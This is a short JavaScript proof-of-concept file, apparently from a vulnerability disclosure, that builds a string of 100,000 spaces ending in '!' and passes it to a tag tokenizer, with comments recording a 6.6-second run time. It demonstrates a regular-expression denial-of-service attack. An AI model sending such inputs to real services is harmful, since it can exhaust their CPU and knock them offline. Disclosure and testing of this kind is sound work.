import tagTokenizer from "./tag.js";

//Attack String :""+" "*100000+"!"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "!";

const spec = {
  source: [
    {
      tokens: {
        description: str,
      },
      number: 1,
    },
  ],
  problems: [],
  tag: "",
  postTag: "",
};
const myFunc = tagTokenizer();
console.log(myFunc(spec));


// real    0m6.613s
// user    0m6.597s
// sys     0m0.000s